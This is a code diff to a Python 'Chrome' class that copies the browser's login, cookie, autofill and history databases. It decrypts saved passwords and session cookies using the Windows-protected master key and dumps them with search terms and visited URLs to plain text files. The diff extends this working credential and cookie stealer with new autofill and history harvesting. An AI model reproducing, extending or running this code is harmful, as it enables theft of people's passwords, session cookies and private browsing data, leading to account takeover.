@@ -5,6 +5,7 @@ import base64
 import sqlite3
 from Cryptodome.Cipher import AES
 from win32crypt import CryptUnprotectData
+from datetime import datetime, timezone, timedelta
 
 
 class Chrome:
@@ -33,10 +34,16 @@ class Chrome:
         except Exception as e:
             return str(e)
 
+    @staticmethod
+    def convert_time(time):
+        epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
+        code_stamp = epoch + timedelta(microseconds=time)
+        return code_stamp.strftime('%Y/%m/%d - %H:%M:%S')
+
     def passwords(self):
         try:
             login_db = self._user_data + "\\Default\\Login Data"
-            login_db_copy = os.getenv("TEMP") + "\\login.db"
+            login_db_copy = os.getenv("TEMP") + "\\Login.db"
             shutil.copy2(login_db, login_db_copy)
             conn = sqlite3.connect(login_db_copy)
             cursor = conn.cursor()
@@ -44,10 +51,10 @@ class Chrome:
                 cursor.execute("SELECT action_url, username_value, password_value FROM logins")
 
                 with open("passwords.txt", "w") as f:
-                    for r in cursor.fetchall():
-                        url = r[0]
-                        username = r[1]
-                        encrypted_password = r[2]
+                    for item in cursor.fetchall():
+                        url = item[0]
+                        username = item[1]
+                        encrypted_password = item[2]
                         decrypted_password = self._decrypt(encrypted_password, self._master_key)
                         f.write(f"URL: {url}\nUSR: {username}\nPDW: {decrypted_password}\n\n")
 
@@ -63,7 +70,7 @@ class Chrome:
     def cookies(self):
         try:
             cookies_db = self._user_data + "\\Default\\Network\\cookies"
-            cookies_db_copy = os.getenv("TEMP") + "\\cookies.db"
+            cookies_db_copy = os.getenv("TEMP") + "\\Cookies.db"
             shutil.copy2(cookies_db, cookies_db_copy)
             conn = sqlite3.connect(cookies_db_copy)
             cursor = conn.cursor()
@@ -71,12 +78,11 @@ class Chrome:
                 cursor.execute("SELECT host_key, name, encrypted_value from cookies")
 
                 with open("cookies.txt", "w") as f:
-                    for r in cursor.fetchall():
-                        host = r[0]
-                        user = r[1]
-                        decrypted_cookie = self._decrypt(r[2], self._master_key)
-                        if host != "":
-                            f.write(f"HOST KEY: {host}{' ' * (30 - len(host))} NAME: {user}{' ' * (30 - len(user))} VALUE: {decrypted_cookie}\n")
+                    for item in cursor.fetchall():
+                        host = item[0]
+                        user = item[1]
+                        decrypted_cookie = self._decrypt(item[2], self._master_key)
+                        f.write(f"HOST KEY: {host}{' ' * (30 - len(host))} NAME: {user}{' ' * (30 - len(user))} VALUE: {decrypted_cookie}\n")
 
             except sqlite3.Error:
                 pass
@@ -87,8 +93,70 @@ class Chrome:
         except Exception as e:
             print(f"[!]Error: {e}")
 
+    def autofill(self):
+        try:
+            web_data_db = self._user_data + "\\Default\\Web Data"
+            web_data_db_copy = os.getenv("TEMP") + "\\History.db"
+            shutil.copy2(web_data_db, web_data_db_copy)
+            conn = sqlite3.connect(web_data_db_copy)
+            cursor = conn.cursor()
+
+            try:
+                cursor.execute("SELECT name, value FROM autofill")
+
+                with open("autofill.txt", "w") as f:
+                    for item in cursor.fetchall():
+                        name = item[0]
+                        value = item[1]
+                        f.write(f"{name}: {value}")
+
+            except sqlite3.Error:
+                pass
+
+            cursor.close()
+            conn.close()
+            os.remove(web_data_db_copy)
+        except Exception as e:
+            print(f"[!]Error {e}")
+
+    def history(self):
+        try:
+            history_db = self._user_data + "\\Default\\History"
+            history_db_copy = os.getenv("TEMP") + "\\History.db"
+            shutil.copy2(history_db, history_db_copy)
+            conn = sqlite3.connect(history_db_copy)
+            cursor = conn.cursor()
+
+            try:
+                cursor.execute('SELECT term FROM keyword_search_terms')
+
+                with open("search_history.txt", "w") as f:
+                    for item in cursor.fetchall():
+                        term = item[0]
+                        f.write(f"{term}\n")
+
+                cursor.execute('SELECT title, url, last_visit_time FROM urls')
+
+                with open("search_history.txt", "w") as f:
+                    for item in cursor.fetchall():
+                        title = item[0]
+                        url = item[1]
+                        last_time = self.convert_time(item[2])
+                        f.write(f"Title: {title}\nUrl: {url}\nLast Time Visit: {last_time}\n\n")
+
+            except sqlite3.Error:
+                pass
+
+            cursor.close()
+            conn.close()
+            os.remove(history_db_copy)
+        except Exception as e:
+            print(f"[!]Error {e}")
+
 
 if __name__ == "__main__":
     chrome = Chrome()
     chrome.passwords()
     chrome.cookies()
+    chrome.history()
+    chrome.autofill()
